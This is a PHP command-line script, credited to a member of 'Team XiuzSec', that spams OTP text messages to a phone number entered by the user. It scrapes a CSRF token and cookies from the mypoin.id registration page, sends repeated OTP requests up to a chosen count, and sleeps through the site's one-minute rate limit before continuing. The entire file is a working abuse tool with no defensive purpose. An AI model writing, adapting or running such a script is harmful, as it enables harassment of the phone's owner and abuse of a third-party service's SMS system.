<?php
//http requests
function curl($url=null,$headers,$data=null){
  $c=curl_init();
  curl_setopt($c,CURLOPT_URL,$url);
  curl_setopt($c,CURLOPT_RETURNTRANSFER,true);
  curl_setopt($c,CURLOPT_HEADER,true);
  curl_setopt($c,CURLOPT_HTTPHEADER,$headers);
  if($data){
    curl_setopt($c,CURLOPT_POST,2);
    curl_setopt($c,CURLOPT_POSTFIELDS,$data);
  }
  $r=curl_exec($c);
  return $r;

}

//get token cok
function get_token(){
    $res=curl(
        $url="https://mypoin.id/register/validate-phone-number",
        array("User-Agent: Mozilla/5.0")
        );
    preg_match("/set-cookie: (__cfduid=.*?;)/",$res,$t1);
    preg_match("/set-cookie: (csrftoken=.*?;)/",$res,$t2);
    preg_match("/csrfmiddlewaretoken' value='(.*?)'/",$res,$t3);
    $data = array(
        $t3[1],
        $t1[1] . " " . $t2[1],
    );
    return $data;
}

//main 
function spam(){
    echo "[!] spam otp mypoin By Ikbal Alfairizy\n";
    echo "[!] Team \e[33mXiuzSec\e[0m           \n";
    echo "[?] nomor: ";
    $nomor=trim(FGETS(STDIN));
    echo "[?] count: ";
    $jumlah=(int)trim(FGETS(STDIN));
    for($i = 0;$i < $jumlah;$i++){
        $token=get_token();
        $res=curl(
          $url="https://mypoin.id/register/request-otp",
          array(
              "Host: mypoin.id",
              "Connection: keep-alive",
              "Origin: https://mypoin.id",
              "X-Requested-With: XMLHttpRequest",
              "Save-Data: on","User-Agent: Mozilla/5.0",
              "Sec-Fetch-Site: same-origin",
              "Sec-Fetch-Mode: cors",
              "Referer: https://mypoin.id/register/validate-phone-number",
              "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6",
              "Cookie: $token[1] _ga=GA1.2.1869740135.1577209731; _gid=GA1.2.1108537041.1579781916; _gat_gtag_UA_108385159_1=1"),
          $data="phone=$nomor&csrfmiddlewaretoken=$token[0]",
          );
        if(strpos($res,'"ok"')){
            echo "\e[92m[$i] spamming suksess $nomor\n";
        }elseif(strpos(strtolower($res),'"silakan menunggu 1 menit lagi sebelum mencoba kembali"')){
            echo "\e[94m[$i] delay 1 menit \n";
            sleep(60);
        }else{
            echo "\e[91m[$i] spamming gagal $nomor  \n";
        }
    }
}

spam();

?>
